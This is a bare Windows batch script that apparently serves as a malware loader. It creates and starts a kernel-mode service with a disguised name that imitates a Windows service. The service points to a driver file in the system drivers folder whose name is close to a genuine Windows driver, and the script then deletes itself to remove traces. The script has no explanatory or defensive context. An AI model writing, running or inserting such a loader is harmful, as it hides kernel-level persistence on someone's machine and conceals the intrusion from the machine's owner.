@echo off
cd %~dp0
sc create ServiceUserBcastDVR_748 binpath=C:\Windows\System32\drivers\mrxdiv.sys type=kernel
sc start ServiceUserBcastDVR_748
del "%~f0"



